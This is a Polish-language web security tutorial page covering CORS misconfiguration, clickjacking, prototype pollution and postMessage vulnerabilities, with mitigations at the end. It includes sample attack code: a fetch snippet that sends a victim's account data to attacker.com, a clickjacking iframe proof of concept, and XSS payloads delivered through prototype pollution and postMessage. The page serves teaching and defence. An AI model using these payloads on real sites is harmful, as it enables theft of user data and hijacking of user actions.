---
id: "client-side-attacks"
title: "Ataki po stronie klienta (CORS, Clickjacking, Prototype Pollution, postMessage)"
sidebar_position: 20
---

# Ataki po stronie klienta (Client-Side)

Poza XSS istnieje cała rodzina podatności działających w przeglądarce ofiary. Wynikają z błędnej konfiguracji mechanizmów bezpieczeństwa przeglądarki lub z niebezpiecznego kodu JavaScript po stronie klienta. Mogą prowadzić do kradzieży danych, przejęcia akcji użytkownika, a nawet do XSS i RCE w aplikacjach Node.

---

##  CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) kontroluje, które domeny mogą odczytywać odpowiedzi z innego pochodzenia. Błędna konfiguracja pozwala obcej domenie czytać wrażliwe dane.

### **1️⃣ Niebezpieczne odbicie Origin**
Serwer odbija dowolny `Origin` i dopuszcza poświadczenia:
```http
GET /api/account HTTP/1.1
Origin: https://attacker.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
To pozwala stronie atakującego odczytać dane konta zalogowanej ofiary:
```javascript
fetch('https://example.com/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/log?d=' + encodeURIComponent(d)));
```

### **2️⃣ Inne wzorce do przetestowania**
- Akceptacja `Origin: null` (sandbox iframe, `data:`) razem z `Allow-Credentials: true`.
- Dopasowanie po prefiksie/sufiksie: `example.com.attacker.com` lub `attacker-example.com`.
- Zaufanie do wszystkich subdomen przy podatnej subdomenie (XSS na jednej → odczyt z głównej).

> `Access-Control-Allow-Origin: *` **nie** zwraca z `Allow-Credentials: true` — najgroźniejszy jest dynamiczny odbity Origin z poświadczeniami.

---

## 🖼️ Clickjacking

Atakujący osadza docelową stronę w przezroczystym `<iframe>` i nakłania ofiarę do kliknięcia elementu (np. „Usuń konto", „Autoryzuj"), który myśli, że klika coś innego.

### **1️⃣ Prosty PoC**
```html
<style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 1000px; height: 800px; }
  button { position: absolute; top: 320px; left: 60px; z-index: -1; }
</style>
<button>Kliknij, aby wygrać nagrodę!</button>
<iframe src="https://example.com/account/delete"></iframe>
```

### **2️⃣ Test podatności**
Strona jest podatna, jeśli **nie** wysyła:
- `X-Frame-Options: DENY` / `SAMEORIGIN`, lub
- `Content-Security-Policy: frame-ancestors 'none'` (nowocześniejsze, preferowane).

Sprawdzenie:
```bash
curl -sI https://example.com | grep -iE "x-frame-options|frame-ancestors"
```

---

## 🧬 Prototype Pollution

Specyficzna dla JavaScriptu podatność polegająca na wstrzyknięciu właściwości do `Object.prototype`, co wpływa na **wszystkie** obiekty w aplikacji. Może prowadzić do DoS, obejścia logiki, XSS, a w Node.js nawet do RCE.

### **1️⃣ Wektory wstrzyknięcia**
Klucze `__proto__`, `constructor`, `prototype` w danych łączonych przez podatny merge/clone:
```javascript
// Podatne łączenie obiektów
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
({}).isAdmin // true — zanieczyszczony prototyp
```

### **2️⃣ Client-side (URL → gadżet)**
Parametry URL parsowane do obiektu:
```
https://example.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```
Jeśli aplikacja używa zanieczyszczonej właściwości jako „gadżetu" (np. wstawia ją do DOM) — powstaje XSS.

### **3️⃣ Server-side (Node.js)**
Zanieczyszczenie prototypu w parametrach do `child_process`/szablonów może eskalować do **RCE**. Narzędzie do wykrywania client-side: **DOM Invader** (wbudowany w przeglądarkę Burpa).

---

## 📨 Ataki na postMessage

`window.postMessage` umożliwia komunikację między oknami/iframe'ami różnego pochodzenia. Niebezpieczne, gdy handler nie waliduje nadawcy.

### **1️⃣ Brak walidacji `origin`**
```javascript
// Podatny odbiorca — ufa każdej wiadomości
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data; // DOM XSS
});
```
Atakujący z osadzającej strony wysyła:
```javascript
iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
```

### **2️⃣ Co testować**
- Czy handler sprawdza `event.origin` względem allowlisty?
- Czy dane z wiadomości trafiają do `innerHTML`, `eval`, `location` bez sanityzacji?
- Czy nadawca wysyła wrażliwe dane z `targetOrigin: '*'` (wyciek)?

---

##  Jak zabezpieczyć warstwę kliencką?
✅ **CORS** – allowlist konkretnych originów, nigdy odbicie dowolnego Origin z `Allow-Credentials: true`.
✅ **Clickjacking** – `CSP: frame-ancestors 'none'` (lub allowlist) oraz `X-Frame-Options`.
✅ **Prototype Pollution** – używaj `Map` zamiast obiektów na dane użytkownika, blokuj klucze `__proto__`/`constructor`, `Object.freeze(Object.prototype)`.
✅ **postMessage** – zawsze waliduj `event.origin`, nie wstawiaj danych do DOM bez sanityzacji, nadawaj z konkretnym `targetOrigin`.
✅ **Ogólnie** – wdrażaj rygorystyczne **Content Security Policy** jako warstwę głębokiej obrony.

---

Warstwa kliencka to często niedoceniana powierzchnia ataku. Kolejnym krokiem będą zaawansowane techniki: **HTTP Request Smuggling i Web Cache Poisoning**! 🚀
